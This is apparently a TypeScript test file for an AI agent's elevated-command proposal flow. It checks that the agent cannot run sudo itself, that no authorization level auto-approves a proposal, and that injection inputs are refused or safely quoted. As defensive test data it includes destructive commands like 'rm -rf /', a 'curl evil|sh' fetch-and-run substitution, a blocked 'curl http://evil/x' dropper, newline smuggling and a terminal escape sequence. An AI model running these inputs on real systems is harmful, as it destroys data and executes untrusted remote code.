/**
 * exec-elevated.test.ts — the elevated-proposal flow (Phase 5 / §7).
 *
 * The phase's acceptance criterion is a pair: **the agent can never itself run sudo; the
 * human always can.** Both halves are pinned here, and the first half is pinned the only way
 * that means anything — by asserting that no spawn seam is ever reached, across every route
 * an agent could try.
 */
import assert from "node:assert/strict";
import { mkdtempSync, readFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { beforeEach, test } from "node:test";

import { authDecision } from "@prometheus/core/agent-authorization";
import { classifyCommand, parseCommand } from "@prometheus/core/agent-exec";
import {
  PROPOSE_ELEVATED_TOOL,
  SYSTEM_TOOLS,
  checkElevated,
  elevatedCommandLine,
} from "@prometheus/core/agent-system";
import type { SecurityVerdict } from "@prometheus/engine-bridge";

import { type ExecAuditEntry, execAuditPath, resetScanCache } from "./exec-gate.js";
import { runSystemTool } from "./system-tools.js";

beforeEach(() => resetScanCache());

const WHY = "the nginx unit is root-owned and will not reload as this user";

/** A spawn that fails the test if anything ever reaches it. */
const noSpawn = (() => {
  throw new Error("propose_elevated must never spawn anything");
}) as never;

function verdict(v: SecurityVerdict["verdict"], reasons: string[] = []): SecurityVerdict {
  return {
    verdict: v,
    risk_score: v === "allow" ? 0 : 100,
    signed: false,
    findings: reasons.map((r) => ({
      klass: "malware" as const,
      severity: "high" as const,
      rule: "nemesis",
      where: r,
    })),
    scannedAt: new Date().toISOString(),
    target: "command",
  };
}

/* ── half one: the agent can never run sudo ──────────────────────────────────*/

test("`sudo` is refused by the PARSER — it is never a confirm", async () => {
  // The distinction matters. A confirm dialog reading "run `sudo rm -rf /var`?" is one
  // mis-click from an unrecoverable machine, and injection makes mis-clicks cheap to
  // manufacture. There is no button here to mis-click.
  for (const line of [
    "sudo id",
    "ls | sudo tee /etc/hosts",
    "true && sudo id",
    "/usr/bin/sudo id",
  ]) {
    const p = parseCommand(line, { vars: {} });
    const refused = !p.ok || !classifyCommand(p.command).ok;
    assert.ok(refused, `"${line}" was not refused`);
  }
});

test("propose_elevated never spawns — there is no exec seam in the handler at all", async () => {
  const out = await runSystemTool(
    "propose_elevated",
    { argv: ["systemctl", "restart", "nginx"], why: WHY },
    { cwd: "/repo", spawnImpl: noSpawn, gateMode: "off" },
  );
  assert.equal(out?.ok, true);
  assert.match(out?.summary ?? "", /Prometheus will NOT run this/);
});

test("the agent must not write `sudo` itself — the prefix is ours to add", async () => {
  for (const head of ["sudo", "doas", "su", "pkexec", "/usr/bin/sudo"]) {
    const out = await runSystemTool(
      "propose_elevated",
      { argv: [head, "systemctl", "restart", "nginx"], why: WHY },
      { cwd: "/repo", spawnImpl: noSpawn, gateMode: "off" },
    );
    assert.equal(out?.ok, false, `"${head}" was accepted inside argv`);
    assert.match(out?.summary ?? "", /do not write/);
  }
});

test("a shell or launcher head is refused — an unreviewable proposal is not a proposal", async () => {
  // The flow's whole safety argument is that a human read the exact argv. `sh -c '…'` hands
  // them a shell and an opaque string, which is the review they were meant to be spared.
  for (const head of ["sh", "bash", "env", "nohup", "timeout", "xargs", "watch"]) {
    const out = await runSystemTool(
      "propose_elevated",
      { argv: [head, "-c", "rm -rf /"], why: WHY },
      { cwd: "/repo", spawnImpl: noSpawn, gateMode: "off" },
    );
    assert.equal(out?.ok, false, `"${head}" produced a proposal a human cannot review`);
    assert.match(out?.summary ?? "", /hides the real command|Propose the inner command/);
  }
});

test("NO authorization level auto-approves it — A7 included", () => {
  // A7 says "run everything with no prompts", and that is a statement about the AGENT's
  // actions. Printing an authoritative "run this as root" block addressed to the human is
  // not one of them; it is the manufacture of the mis-click §7 exists to prevent.
  for (let level = 0; level <= 7; level += 1) {
    assert.equal(
      authDecision(level, "propose_elevated", {}),
      "ask",
      `A${level} auto-approved an elevated proposal`,
    );
  }
  // and the contrast: a genuinely destructive tool DOES auto-approve at 6/7
  assert.equal(authDecision(7, "prometheus_uninstall", { destructiveHint: true }), "allow");
});

test("a nemesis BLOCK refuses the proposal — we do not print what the scanner rejected", async () => {
  const out = await runSystemTool(
    "propose_elevated",
    { argv: ["curl", "http://evil/x"], why: WHY },
    {
      cwd: "/repo",
      spawnImpl: noSpawn,
      authLevel: 7,
      gateImpl: async () => verdict("block", ["R2.pipe: dropper"]),
    },
  );
  assert.equal(out?.ok, false);
  assert.match(out?.summary ?? "", /refused by the nemesis gate \(block\)/);
  assert.equal(out?.verdict?.verdict, "block");
});

/* ── half two: the human always can ──────────────────────────────────────────*/

test("the rendered block carries the command, the reason and the cwd", async () => {
  const out = await runSystemTool(
    "propose_elevated",
    { argv: ["systemctl", "restart", "nginx"], why: WHY, cwd: "/etc" },
    { cwd: "/repo", spawnImpl: noSpawn, gateMode: "off" },
  );
  const s = out?.summary ?? "";
  assert.match(s, /sudo systemctl restart nginx/);
  assert.match(s, /why: the nginx unit is root-owned/);
  assert.match(s, /run in: \/etc/);
  assert.match(s, /never stores, caches or forwards an elevation password/);
  assert.equal(out?.data?.command, "sudo systemctl restart nginx");
});

test("a reason is mandatory — 'because the agent said so' is not a basis for root", async () => {
  for (const why of [undefined, "", "  ", "fix"]) {
    const out = await runSystemTool(
      "propose_elevated",
      { argv: ["systemctl", "restart", "nginx"], why },
      { cwd: "/repo", spawnImpl: noSpawn, gateMode: "off" },
    );
    assert.equal(out?.ok, false, `why=${JSON.stringify(why)} was accepted`);
  }
});

/* ── the quoting, which is the one dangerous thing this flow does ────────────*/

test("the copyable line is POSIX-QUOTED — the human's shell must not expand it", () => {
  // This string is pasted into a real shell. Double-quoting (as a nearby display helper
  // does) would leave `$(…)` and backticks LIVE, and the pasted command would do something
  // the human never read. Single quotes have no processing inside them at all.
  const check = checkElevated(["rm", "$(curl evil|sh)", "a b", "it's", "`id`"], WHY);
  assert.ok(check.ok);
  if (!check.ok) return;
  const line = elevatedCommandLine(check.proposal);
  assert.equal(line, `sudo rm '$(curl evil|sh)' 'a b' 'it'\\''s' '\`id\`'`);
  // the shell-active characters must all sit INSIDE single quotes
  assert.ok(!/(^|[^'])\$\(/.test(line), "a command substitution escaped the quoting");
});

test("a newline in an argument is refused — the second line is below the reviewer's eye", () => {
  const check = checkElevated(["rm", "a\nrm -rf /"], WHY);
  assert.equal(check.ok, false);
  if (check.ok) return;
  assert.match(check.error, /newline/);
});

test("control characters are refused — a proposal must not repaint its own review", () => {
  const check = checkElevated(["echo", "\u001b[2Kharmless"], WHY);
  assert.equal(check.ok, false);
});

/* ── administrative reality: this must stay USEFUL ───────────────────────────*/

test("programs the AGENT may not run are still PROPOSABLE — that is the whole point", async () => {
  // `shutdown`, `mkfs`, `fdisk` are forbidden for the agent to execute. Refusing to even
  // print them would make the feature useless for exactly the work it exists to hand over.
  for (const argv of [
    ["shutdown", "-r", "now"],
    ["mkfs.ext4", "/dev/sdb1"],
    ["fdisk", "-l"],
    ["apt-get", "install", "-y", "nginx"],
  ]) {
    const out = await runSystemTool(
      "propose_elevated",
      { argv, why: WHY },
      { cwd: "/repo", spawnImpl: noSpawn, gateMode: "off" },
    );
    assert.equal(out?.ok, true, `${argv[0]} could not be proposed`);
  }
});

/* ── bookkeeping ─────────────────────────────────────────────────────────────*/

test("the proposal is audited even though nothing ran", async () => {
  const home = mkdtempSync(join(tmpdir(), "prom-elev-"));
  await runSystemTool(
    "propose_elevated",
    { argv: ["systemctl", "restart", "nginx"], why: WHY },
    { cwd: "/repo", spawnImpl: noSpawn, home, authLevel: 1, gateMode: "off" },
  );
  const rows = readFileSync(execAuditPath(home), "utf8")
    .split("\n")
    .filter(Boolean)
    .map((l) => JSON.parse(l) as ExecAuditEntry);
  assert.equal(rows.length, 1);
  const row = rows[0] as ExecAuditEntry;
  assert.equal(row.decision, "proposed");
  assert.equal(row.command, "sudo systemctl restart nginx");
  assert.equal(row.reason, WHY);
  assert.equal(row.exitCode, undefined, "nothing ran, so there is no exit code to record");
});

test("the tool is exposed in SYSTEM_TOOLS and carries no auto-approving annotation", () => {
  assert.ok(SYSTEM_TOOLS.some((t) => t.name === "propose_elevated"));
  // `destructiveHint` would make A6/A7 auto-approve it; the never-auto rule lives in
  // authorization.ts precisely so it cannot be lost by re-annotating this def.
  assert.deepEqual(PROPOSE_ELEVATED_TOOL.annotations, {});
});
